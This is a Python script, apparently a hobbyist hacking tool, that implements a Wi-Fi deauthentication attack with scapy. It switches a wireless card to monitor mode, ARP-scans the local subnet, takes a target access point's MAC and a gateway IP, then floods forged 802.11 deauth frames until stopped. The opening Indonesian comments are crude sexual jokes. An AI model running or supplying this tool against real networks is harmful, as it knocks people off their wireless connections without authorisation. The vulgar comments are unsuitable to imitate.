#gunakan python3 ya
#jangan lupa coli dulu sebelum pake takutnya nggak direspon 
#nonton bokep itu bagus bagi orang orang dunguts

import os
import sys
import signal
import logging
import re
import subprocess
import scapy.all as scapy
import threading
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
import time

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Initialize Rich Console
console = Console()

# Banner
banner = """
██████╗ ███████╗███████╗████████╗ ██████╗ ██████╗ ██╗   ██╗███████╗
██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗██║   ██║██╔════╝
██████╔╝█████╗  ███████╗   ██║   ██║   ██║██████╔╝██║   ██║███████╗
██╔══██╗██╔══╝  ╚════██║   ██║   ██║   ██║██╔══██╗╚██╗ ██╔╝╚════██║
██║  ██║███████╗███████║   ██║   ╚██████╔╝██║  ██║ ╚████╔╝ ███████║
╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝  ╚═══╝  ╚══════╝
"""

# Validate MAC address format
def validate_mac(mac):
    return re.match("^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", mac) is not None

def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except Exception as e:
        logging.error(f"Error getting MAC address for IP {ip}: {e}")
        return None

def set_monitor_mode(interface):
    try:
        subprocess.check_call(["ifconfig", interface, "down"])
        subprocess.check_call(["iwconfig", interface, "mode", "monitor"])
        subprocess.check_call(["ifconfig", interface, "up"])
        logging.info(f"Set {interface} to monitor mode.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error setting {interface} to monitor mode: {e}")
        sys.exit(1)

def deauth(target_mac, gateway_mac, interface, stop_event):
    try:
        dot11 = scapy.Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
        packet = scapy.RadioTap()/dot11/scapy.Dot11Deauth(reason=7)
        while not stop_event.is_set():
            scapy.sendp(packet, iface=interface, inter=0.100, count=1)
        logging.info("Deauthentication attack stopped.")
    except Exception as e:
        logging.error(f"Error during deauthentication attack: {e}")

def signal_handler(sig, frame, stop_event):
    logging.info("Signal received, stopping the attack...")
    stop_event.set()

def display_loading():
    with Progress() as progress:
        task = progress.add_task("[cyan]Loading...", total=100)
        while not progress.tasks[0].completed:
            progress.update(task, advance=1)
            time.sleep(0.01)

def scan_network(interface):
    try:
        arp_request = scapy.ARP(pdst="192.168.1.0/24")
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, iface=interface, timeout=3, verbose=False)[0]

        clients_list = []
        for element in answered_list:
            client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
            clients_list.append(client_dict)

        return clients_list
    except Exception as e:
        logging.error(f"Error scanning network: {e}")
        return []

def main_menu():
    console.print(f"[bold magenta]{banner}[/bold magenta]")
    display_loading()

    logging.info("Starting DEAUTH Original Mode...")

    interfaces = subprocess.check_output("iwconfig", shell=True).decode()
    logging.info("Found interfaces:")
    logging.info(interfaces)

    interface = input("Enter the Wi-Fi interface to use: ")
    set_monitor_mode(interface)

    logging.info("Scanning network for connected devices...")
    devices = scan_network(interface)

    if not devices:
        logging.error("No devices found on the network.")
        sys.exit(1)

    table = Table(title="Connected Devices")
    table.add_column("IP Address", style="cyan")
    table.add_column("MAC Address", style="magenta")

    for device in devices:
        table.add_row(device["ip"], device["mac"])

    console.print(table)

    target_mac = input("Enter the MAC address of the target access point: ")
    if not validate_mac(target_mac):
        logging.error("Invalid target MAC address format.")
        sys.exit(1)

    gateway_ip = input("Enter the IP address of the gateway: ")
    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        logging.error("Failed to retrieve gateway MAC address.")
        sys.exit(1)

    stop_event = threading.Event()
    signal.signal(signal.SIGINT, lambda sig, frame: signal_handler(sig, frame, stop_event))
    signal.signal(signal.SIGTERM, lambda sig, frame: signal_handler(sig, frame, stop_event))

    logging.info("Starting deauthentication attack...")
    deauth(target_mac, gateway_mac, interface, stop_event)

if __name__ == "__main__":
    main_menu()
